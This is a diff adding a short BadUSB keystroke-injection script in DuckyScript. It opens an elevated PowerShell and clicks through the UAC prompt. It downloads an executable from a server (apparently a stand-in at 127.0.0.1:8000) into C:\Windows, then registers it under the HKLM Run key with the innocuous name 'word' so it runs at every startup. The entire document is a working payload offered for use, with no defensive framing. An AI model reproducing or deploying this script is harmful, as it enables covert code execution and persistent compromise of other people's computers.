@@ -1,0 +1,31 @@
+REM TITLE Download file 
+REM AUTHOR Roei Yishay
+REM DESCRIPTION Download file via PS 
+
+
+DELAY 3000 
+WINDOWS r
+DELAY 500
+STRING PowerShell
+DELAY 500
+CTRL SHIFT ENTER 
+DELAY 5000
+RIGHTARROW
+ENTER
+DELAY 3000
+STRING Invoke-WebRequest -URI "127.0.0.1:8000/file" -OutFile "C:\Windows\file.exe"
+ENTER
+
+STRING $registryPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+ENTER
+STRING $entryName = "word"
+ENTER
+
+
+STRING $scriptPath = "C:\Windows\file.exe"
+ENTER
+
+STRING New-Item -Path $registryPath -Force | Out-Null
+ENTER
+STRING New-ItemProperty -Path $registryPath -Name $entryName -Value $scriptPath -PropertyType String -Force
+ENTER
